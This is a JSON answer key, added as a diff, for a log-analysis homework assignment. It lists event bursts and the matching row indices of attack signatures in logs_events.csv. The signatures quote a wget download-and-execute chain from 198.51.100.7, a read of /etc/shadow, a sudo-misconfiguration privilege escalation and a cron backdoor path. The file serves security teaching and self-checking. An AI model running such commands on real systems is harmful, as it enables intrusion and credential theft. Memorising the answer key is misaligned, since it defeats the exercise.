@@ -1,0 +1,82 @@
+{
+  "note": "Индексы — 0-based номера строк данных в logs_events.csv (строка заголовка не считается). Файл предназначен для самопроверки решения ДЗ 3.",
+  "bursts": [
+    {
+      "event_type": "login",
+      "process": "sshd",
+      "count": 60,
+      "start_index": 2175,
+      "end_index": 2234,
+      "t_start": "2026-03-01T09:12:16",
+      "t_end": "2026-03-01T09:12:25",
+      "window_seconds": 10
+    },
+    {
+      "event_type": "login",
+      "process": "python3",
+      "count": 60,
+      "start_index": 28737,
+      "end_index": 28796,
+      "t_start": "2026-03-01T23:57:31",
+      "t_end": "2026-03-01T23:57:40",
+      "window_seconds": 10
+    },
+    {
+      "event_type": "exec",
+      "process": "nginx",
+      "count": 60,
+      "start_index": 48639,
+      "end_index": 48698,
+      "t_start": "2026-03-02T11:00:37",
+      "t_end": "2026-03-02T11:00:46",
+      "window_seconds": 10
+    }
+  ],
+  "signatures": [
+    {
+      "name": "download-and-exec",
+      "substrings": [
+        "cmd=wget http://198.51.100.7/payload.bin -O /tmp/.cache.bin",
+        "cmd=chmod +x /tmp/.cache.bin",
+        "cmd=/tmp/.cache.bin"
+      ],
+      "indices": [
+        62468,
+        62469,
+        62470
+      ],
+      "t_start": "2026-03-02T18:40:12",
+      "t_end": "2026-03-02T18:40:14"
+    },
+    {
+      "name": "shadow-read-privesc",
+      "substrings": [
+        "path=/etc/shadow",
+        "target=root method=sudo-misconfig",
+        "path=/etc/cron.d/backdoor"
+      ],
+      "indices": [
+        68283,
+        68284,
+        68285
+      ],
+      "t_start": "2026-03-02T21:52:50",
+      "t_end": "2026-03-02T21:52:54"
+    },
+    {
+      "name": "download-and-exec",
+      "substrings": [
+        "cmd=wget http://198.51.100.7/payload.bin -O /tmp/.cache.bin",
+        "cmd=chmod +x /tmp/.cache.bin",
+        "cmd=/tmp/.cache.bin"
+      ],
+      "indices": [
+        89094,
+        89095,
+        89096
+      ],
+      "t_start": "2026-03-03T09:28:33",
+      "t_end": "2026-03-03T09:28:33"
+    }
+  ]
+}
